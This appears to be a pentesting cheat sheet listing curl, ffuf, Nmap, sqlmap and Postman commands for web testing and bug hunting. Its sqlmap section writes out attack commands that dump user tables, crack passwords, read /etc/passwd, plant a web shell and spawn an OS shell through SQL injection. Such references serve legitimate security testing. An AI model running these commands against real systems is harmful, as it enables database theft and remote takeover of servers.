# Tools

**Tools**

{% tabs %}
{% tab title="cURL" %}
**sqlmap and ZAP auth/cookie integration**

1. Open ZAP and login in to target application
2. Visit request that contains authenticated cookie
3. Copy the cookie value in the request tab
4. Run sqlmap command with cookie and proxy included

Example uses for the field:

Proxy sqlmap through ZAP with custom user agent "bughunter"

{% code overflow="wrap" %}
```bash
sqlmap -u "https://website.com/vulnerablepage/?id=1&Submit=Submit" --cookie="currentZAPcookie" --proxy http://127.0.0.1:8081 --batch --user-agent bughunter
```
{% endcode %}

Searching for the word "pass"

{% code overflow="wrap" %}
```bash
sqlmap -u "https://website.com/vulnerablepage/?id=1&Submit=Submit" --cookie="currentZAPcookie" --proxy http://127.0.0.1:8081 -D db_name --search -C pass --batch 
```
{% endcode %}

| Command                                                                                                            | Description                                          |
| ------------------------------------------------------------------------------------------------------------------ | ---------------------------------------------------- |
| `curl -h`                                                                                                          | curl help menu                                       |
| `curl website.com`                                                                                                 | Basic GET request                                    |
| `curl -s -O website.com/index.html`                                                                                | Download file                                        |
| `curl -k https://website.com`                                                                                      | Skip HTTPS (SSL) certificate validation              |
| `curl website.com -v`                                                                                              | Print full HTTP request/response details             |
| `curl -I https://www.website.com`                                                                                  | Send HEAD request (only prints response headers)     |
| `curl -i https://www.website.com`                                                                                  | Print response headers and response body             |
| `curl https://www.website.com -A 'Mozilla/5.0'`                                                                    | Set User-Agent header                                |
| `curl -u admin:admin http://<SERVER_IP>:<PORT>/`                                                                   | Set HTTP basic authorization credentials             |
| `curl http://admin:admin@<SERVER_IP>:<PORT>/`                                                                      | Pass HTTP basic authorization credentials in the URL |
| `curl -H 'Authorization: Basic YWRtaW46YWRtaW4=' http://<SERVER_IP>:<PORT>/`                                       | Set request header                                   |
| `curl 'http://<SERVER_IP>:<PORT>/search.php?search=le'`                                                            | Pass GET parameters                                  |
| `curl -X POST -d 'username=admin&password=admin' http://<SERVER_IP>:<PORT>/`                                       | Send POST request with POST data                     |
| `curl -b 'PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1' http://<SERVER_IP>:<PORT>/`                                        | Set request cookies                                  |
| `curl -X POST -d '{"search":"london"}' -H 'Content-Type: application/json' http://<SERVER_IP>:<PORT>/search.php`   | Send POST request with JSON data                     |
| `curl -s https://sonar.omnisint.io/subdomains/{domain} \| jq -r '.[]' \| sort -u`                                  | All subdomains for a given domain.                   |
| `curl -s https://sonar.omnisint.io/tlds/{domain} \| jq -r '.[]' \| sort -u`                                        | All TLDs found for a given domain.                   |
| `curl -s https://sonar.omnisint.io/all/{domain} \| jq -r '.[]' \| sort -u`                                         | All results across all TLDs for a given domain.      |
| `curl -s https://sonar.omnisint.io/reverse/{ip} \| jq -r '.[]' \| sort -u`                                         | Reverse DNS lookup on IP address.                    |
| `curl -s https://sonar.omnisint.io/reverse/{ip}/{mask} \| jq -r '.[]' \| sort -u`                                  | Reverse DNS lookup of a CIDR range.                  |
| `curl -s "https://crt.sh/?q=${TARGET}&output=json" \| jq -r '.[] \| "\(.name_value)\n\(.common_name)"' \| sort -u` | Certificate Transparency.                            |
{% endtab %}

{% tab title="ffuf" %}
| Command                                                                                                                                                         | Description                                                                   |
| --------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------- |
| `ffuf -h`                                                                                                                                                       | ffuf help                                                                     |
| `ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ`                                                                                                       | Directory Fuzzing                                                             |
| `ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/indexFUZZ`                                                                                                  | Extension Fuzzing                                                             |
| `ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php`                                                                                              | Page Fuzzing                                                                  |
| `ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v`                                                              | Recursive Fuzzing                                                             |
| `ffuf -w wordlist.txt:FUZZ -u https://FUZZ.website.com/`                                                                                                        | Sub-domain Fuzzing                                                            |
| `ffuf -w wordlist.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.website.com' -fs xxx`                                                                     | VHost Fuzzing                                                                 |
| `ffuf -w wordlist.txt:FUZZ -u http://admin.website.com:PORT/admin/admin.php?FUZZ=key -fs xxx`                                                                   | Parameter Fuzzing - GET                                                       |
| `ffuf -w wordlist.txt:FUZZ -u http://admin.website.com:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx` | Parameter Fuzzing - POST                                                      |
| `ffuf -w ids.txt:FUZZ -u http://admin.website.com:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx`       | Value Fuzzing                                                                 |
| `ffuf -w ./vhosts -u http:// -H "HOST: FUZZ.target.domain" -fs 612`                                                                                             | Bruteforcing for possible virtual hosts on the target domain using ffuf.      |
| `ffuf -recursion -recursion-depth 1 -u http://192.168.10.10/FUZZ -w /opt/useful/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt`            | Discovering files and folders that cannot be spotted by browsing the website. |
| `ffuf -w ./folders.txt:FOLDERS,./wordlist.txt:WORDLIST,./extensions.txt:EXTENSIONS -u http://www.target.domain/FOLDERS/WORDLISTEXTENSIONS`                      | Mutated bruteforcing                                                          |
{% endtab %}

{% tab title="Nmap" %}
### Nmap

Scan a port with Nmap via proxy with the `-Pn` flag to skip host discovery and scripts

```shell-session
nmap --proxies http://127.0.0.1:8080 SERVER_IP -pPORT -Pn -sC
```
{% endtab %}

{% tab title="Git" %}
**How to commit changes from local machine**
{% endtab %}

{% tab title="SQLmap" %}
| Command                                                                                                                   | Description                                                 |
| ------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------- |
| `sqlmap -h`                                                                                                               | View the basic help menu                                    |
| `sqlmap -hh`                                                                                                              | View the advanced help menu                                 |
| `sqlmap -u "http://www.example.com/vuln.php?id=1" --batch`                                                                | Run `SQLMap` without asking for user input                  |
| `sqlmap 'http://www.example.com/' --data 'uid=1&name=test'`                                                               | `SQLMap` with POST request                                  |
| `sqlmap -u 'https://site.com' --data '{"User":"abcdefg","Pwd":"Abc@123"}' --random-agent --ignore-code=403 --dbs --hex`   | SQLMap POST with JSON data                                  |
| `sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'`                                                              | POST request specifying an injection point with an asterisk |
| `sqlmap -r req.txt`                                                                                                       | Passing an HTTP request file to `SQLMap`                    |
| `sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'`                                                        | Specifying a cookie header                                  |
| `sqlmap -u www.target.com --data='id=1' --method PUT`                                                                     | Specifying a PUT request                                    |
| `sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt`                                             | Store traffic to an output file                             |
| `sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch`                                                            | Specify verbosity level                                     |
| `sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"`                                                     | Specifying a prefix or suffix                               |
| `sqlmap -u www.example.com/?id=1 -v 3 --level=5`                                                                          | Specifying the level and risk                               |
| `sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba`                                  | Basic DB enumeration                                        |
| `sqlmap -u "http://www.example.com/?id=1" --tables -D testdb`                                                             | Table enumeration                                           |
| `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname`                                      | Table/row enumeration                                       |
| `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"`                             | Conditional enumeration                                     |
| `sqlmap -u "http://www.example.com/?id=1" --schema`                                                                       | Database schema enumeration                                 |
| `sqlmap -u "http://www.example.com/?id=1" --search -T user`                                                               | Searching for data                                          |
| `sqlmap -u "http://www.example.com/?id=1" --passwords --batch`                                                            | Password enumeration and cracking                           |
| `sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"` | Anti-CSRF token bypass                                      |
| `sqlmap --list-tampers`                                                                                                   | List all tamper scripts                                     |
| `sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba`                                                              | Check for DBA privileges                                    |
| `sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"`                                                      | Reading a local file                                        |
| `sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"`                 | Writing a file                                              |
| `sqlmap -u "http://www.example.com/?id=1" --os-shell`                                                                     | Spawning an OS shell                                        |
{% endtab %}

{% tab title="Postman" %}
**Setup**

1. Set manual upstream proxy (Burp/ZAP)
2. Save first successful request as new collection
3. Highlight base URL and right-click "set as variable" and select collection scope
4. Set other common URLs for testing as different variables
5. Verify new variables by hovering over Collection>"more actions" dropdown menu> Variables tab

**Query Parameters**

1. Name and Save new request to corresponding collection

(Optional) Modify key and value pair `{{baseURL}}?key=value`

**Path Variables**
{% endtab %}
{% endtabs %}
